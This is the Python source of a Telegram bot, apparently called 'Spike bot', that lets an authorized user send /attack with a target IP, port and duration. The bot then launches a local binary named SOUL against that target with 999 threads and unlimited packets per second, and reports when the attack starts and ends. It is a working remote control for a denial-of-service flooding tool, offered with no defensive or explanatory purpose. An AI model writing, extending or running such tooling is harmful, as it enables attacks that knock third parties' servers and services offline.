import os
import subprocess
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import config  # BOT_TOKEN and USER_ID

AUTHORIZED_USERS = [str(config.USER_ID)]
MAX_THREADS = "999"
MAX_PPS = "-1"  # unlimited packets per second

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ Welcome! Use /attack <IP> <PORT> <DURATION> to start SOUL attacks."
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ You are not authorized to run commands.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>")
        return

    ip, port, duration = args
    try:
        os.chmod("./SOUL", 0o755)

        # Notify attack start
        await update.message.reply_text(
            f"⚡ Attack started on {ip}:{port} for {duration} seconds."
        )

        # Run SOUL in background
        process = await asyncio.create_subprocess_exec(
            "./SOUL", ip, str(port), str(duration), MAX_THREADS, MAX_PPS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        # Wait for the attack to finish
        await process.wait()

        # Notify attack end
        await update.message.reply_text(
            f"✅ Attack on {ip}:{port} for {duration} seconds completed."
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to start attack: {str(e)}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(config.BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))

    print("Spike bot is running...")
    app.run_polling()
